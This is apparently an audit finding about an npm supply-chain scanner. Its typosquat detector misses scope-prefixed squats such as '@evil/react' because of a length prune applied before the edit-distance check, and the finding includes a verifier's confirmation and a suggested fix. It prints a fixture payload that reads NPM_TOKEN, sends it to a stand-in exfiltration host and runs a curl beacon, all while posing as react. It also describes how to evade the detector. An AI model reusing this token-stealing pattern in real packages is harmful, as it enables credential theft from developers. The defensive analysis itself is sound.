## N4 — Scope-prefix typosquat (`@evil-org/react`) evades typosquatDetector because DL distance exceeds maxDist=2

**Verdict:** partial · **Severity:** high (typosquat signal silenced; BLOCK verdict preserved for fixture with explicit capabilities)

**Description**: `closestTop` in `typo.ts:39-51` applies a length-prune before computing Damerau-Levenshtein distance: `Math.abs(top.length - name.length) > maxDist` eliminates all unscoped top names for any scope-prefixed candidate. `@evil/react` vs `react` has a length difference of 6, exceeding `maxDist=2`. Even scoped entries in `TOP_NPM_NAMES` (e.g. `@types/react` at distance 5) far exceed `maxDist=2`. For the whole class of scope-prefix squats, `deps.typosquat-candidate` is never emitted and Escalation 2 is never reached.

```javascript
// @evil/react vs react:   damerau-levenshtein steps === 6  (> maxDist=2)
// @react-community/react vs react: steps === 18 (> maxDist=2)
//
// package/index.js (fixture payload with child_process + https + NPM_TOKEN)
const cp = require("child_process");
const https = require("https");
const t = process.env.NPM_TOKEN;
https.get("https://exfil.example.invalid/collect?t=" + t);
cp.exec("curl https://exfil.example.invalid/beacon");
module.exports = require("react");
```

**Detectors bypassed**: deps.typosquat-candidate, typosquat-to-BLOCK escalation (Escalation 2)

**Verifier's finding**: The typosquat detector gap is real and fully confirmed. `closestTop('@react-community/react', 2)` returns `null` because the length prune fires before DL is computed for every entry in `TOP_NPM_NAMES`. However, the exploit's own fixture still yields BLOCK from capability detectors: `exec.new-module` (child_process), `net.new-module` (https), `env.token-harvest` (NPM_TOKEN), and `net.new-endpoint` (exfil URL matched by URL_REGEX). The typosquat framing signal is silenced, but the BLOCK verdict itself is not downgraded. The gap only becomes a full bypass when combined with N1 (bundled deps) or N2 (inspector) to suppress the capability signals.

**Suggested fix**: Before the DL comparison, strip `@scope/` from the candidate and compare the base name against the unscoped top list. If `TOP_SET_UNSCOPED.has(base)` or `dl(base, top).steps <= 2`, emit `deps.scope-squat` at WARN with high confidence. Maintain an allowlist of `KNOWN_TRUSTED_SCOPES` (`@babel`, `@types`, `@aws-sdk`, `@microsoft`, `@angular`, `@vercel`, `@nestjs`, `@testing-library`, `@rollup`, `@emotion`, `@solana`, `@prisma`) so legitimate scoped packages don't self-flag.
